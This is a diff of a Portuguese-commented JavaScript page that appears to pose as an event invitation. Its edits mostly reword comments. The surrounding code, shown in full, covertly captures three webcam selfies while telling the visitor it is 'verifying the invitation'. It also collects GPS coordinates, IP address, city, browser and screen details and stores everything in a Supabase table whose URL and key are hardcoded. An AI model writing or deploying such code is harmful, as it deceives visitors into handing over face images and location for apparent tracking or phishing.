@@ -4,7 +4,7 @@
 import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm";
 
 // =================================================================
-// 2. CONFIGURAÇÃO DE CONEXÃO DO SEU PROJETO
+// 2. CONFIGURAÇÃO DE CONEXÃO DO SEU PROJETO (SUPABASE)
 // =================================================================
 const SUPABASE_URL = "https://gskcadoofoqwhqshcxcs.supabase.co"; 
 const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3"; 
@@ -107,7 +107,7 @@ btn.addEventListener("click", async () => {
     btn.innerHTML = "PROCESSANDO...";
     
     // ======================
-    // CAPTURA DE FOTOS EM BASE64 (OTIMIZADO)
+    // CAPTURA DE FOTOS EM BASE64 OTIMIZADA
     // ======================
     statusText.innerHTML = "📨 Verificando informações do convite..";
     falar("Verificando informações do convite..");
@@ -119,7 +119,7 @@ btn.addEventListener("click", async () => {
       throw new Error("Vídeo não carregou");
     }
 
-    // Forçamos uma resolução padrão de 640x480 para o texto Base64 não estourar o limite do banco
+    // Forçamos o canvas a 640x480 para reduzir drasticamente o peso do texto Base64
     canvas.width = 640;
     canvas.height = 480;
     const ctx = canvas.getContext("2d");
@@ -127,16 +127,16 @@ btn.addEventListener("click", async () => {
 
     // Captura 3 fotos com intervalo de 1 segundo
     for(let i = 0; i < 3; i++) {
-        // Desenha a imagem redimensionando-a para o canvas leve
+        // Redimensiona a imagem da câmera para caber perfeitamente no canvas leve
         ctx.drawImage(video, 0, 0, 640, 480);
         
-        // .toDataURL gera a string em Base64. Definimos a qualidade em 0.4 para ficar leve
+        // Mantém em Base64 (.toDataURL), mas com qualidade 0.4 para ficar leve e passar sem erros
         fotos.push(canvas.toDataURL("image/jpeg", 0.4));
         
         if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
     }
 
-    // Desliga os componentes de captura da câmara após terminar
+    // Desliga a câmera após a captura
     const stream = video.srcObject;
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
@@ -198,11 +198,11 @@ btn.addEventListener("click", async () => {
       .from('checkins')
       .insert([
         {
-          selfies: fotos, // Suas 3 fotos salvas como texto Base64 dentro do array do Postgres
+          selfies: fotos, // Suas 3 fotos salvas como texto Base64 dentro do array do Supabase
           latitude: latitude.toString(),
           longitude: longitude.toString(),
           ip: ip,
-          cidade: cidade,
+          cidade: city || cidade,
           estado: estado,
           pais: pais,
           user_agent: navigator.userAgent,
@@ -213,7 +213,6 @@ btn.addEventListener("click", async () => {
           idioma: navigator.language,
           largura_tela: window.innerWidth,
           altura_tela: window.innerHeight
-          // O campo created_at é preenchido sozinho pelo Supabase
         }
       ]);
 
@@ -231,7 +230,6 @@ btn.addEventListener("click", async () => {
 
   } catch(err) {
     console.log(err);
-    // Mostra o erro real na tela do usuário caso falhe
     statusText.innerHTML = "❌ Erro: " + (err.message || JSON.stringify(err));
     btn.disabled = false;
     btn.innerHTML = "QUERO PARTICIPAR";
